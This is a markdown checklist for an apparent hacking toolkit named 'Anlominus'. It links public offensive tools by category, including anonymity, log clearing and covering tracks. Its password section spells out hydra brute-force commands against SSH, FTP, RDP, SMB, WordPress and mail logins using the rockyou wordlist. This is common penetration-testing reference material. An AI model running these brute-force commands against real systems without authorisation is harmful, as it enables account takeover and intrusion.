
- [ ] Anlominus:
  - [ ] 00 - Anonymity
    - [ ] 00 - Firewall Rules
    - [ ] 01 - Clear Logs
    - [ ] 02 - Clear History
    - [ ] 03 - Change MAC Address
    - [ ] 04 - Change IP Address
    - [ ] 05 - Change Routing    
  - [ ] 01 - Information Gathering
    - [ ] 01 - Systems Information
      - [ ] [sherlock](https://github.com/sherlock-project/sherlock)
      - [ ] [theHarvester](https://github.com/laramies/theHarvester)
      - [ ] [RED_HAWK](https://github.com/Tuhinshubhra/RED_HAWK)
    - [ ] 02 - Networks Information
      - [ ] [nmap](https://github.com/nmap/nmap)
    - [ ] 03 - Social Information
  - [ ] 02 - Vulnerability Assessment
  - [ ] 03 - Web Application HacKing
  - [ ] 04 - Database Assessment
  - [ ] 05 - Password HacKing
    - [ ] [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper)
    - [ ] [hashcat](https://github.com/hashcat/hashcat)
    - [ ] [thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

      - Hydra is a command line program brute forcer. The syntax is
        - `hydra -l <username> -P <path to wordlist> <IP> <service>`

      - If SSH is open for example, you can try
        - `hydra -l root -P <path to wordlist> <IP> ssh`

      Kali Linux comes with a 14 million password wordlist by default in /usr/share/wordlists/rockyou.txt.gz

      - You should extract this file.
        - `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

      ### Some examples below, change the IP to your targets IP.

      - FTP:
        - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ftp -o ftp-result.txt`

      - TELNET:
        - `hydra -L /usr/share/wordlists/common-usernames -P /usr/share/wordlists/rockyou.txt 192.168.1.1 telnet`

      - SSH:
        - `hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh -o ssh-result.txt`

      - Windows Remote Desktop
        - `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`

      - Wordpress Admin login
        - `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

      - SMB
        - `hydra -L usernames.txt -P passwords.txt $ip smb -V -f`

      - POP3
        - `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

      - SMTP
        - `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V  `

  - [ ] 06 - Wireless HacKing
    - [ ] [aircrack-ng](https://github.com/aircrack-ng/aircrack-ng)
    - [ ] [bettercap](https://github.com/bettercap/bettercap)
    - [ ] [WiFi-Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin)
    - [ ] [Wifipumpkin3](https://github.com/P0cL4bs/wifipumpkin3)
    - [ ] [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
    - [ ] [Airbash](https://github.com/tehw0lf/airbash)
    - [ ] [WireSpy](https://github.com/aress31/wirespy)
  - [ ] 07 - Reverse Engineering
  - [ ] 08 - Exploit Frameworks & DataBases
    - [ ] [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
    - [ ] [BeEF](https://github.com/beefproject/beef)
    - [ ] [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit)
    - [ ] [Bettercap](https://github.com/bettercap/bettercap)
    - [ ] [MITMf](https://github.com/byt3bl33d3r/MITMf)
    - [ ] [TheFatRat](https://github.com/Screetsec/TheFatRat)
    - [ ] [LAZY](https://github.com/arismelachroinos/lscript)
    - [ ] [KitHack](https://github.com/AdrMXR/KitHack)
  - [ ] 09 - Sniffing - Spoofing
  - [ ] 10 - Gaining & Maintaining Access
  - [ ] 11 - Digital Forensic
  - [ ] 12 - Analysis & Reporting
  - [ ] 13 - Social Engineering
  - [ ] 14 - Privilege Enumeration & Escalation
    - [ ] Linux Enumeration:
      - [ ] [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
      - [ ] [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
    - [ ]
  - [ ] 15 - Malware Analysis Labs/Tools
  - [ ] 16 - Covering Tracks
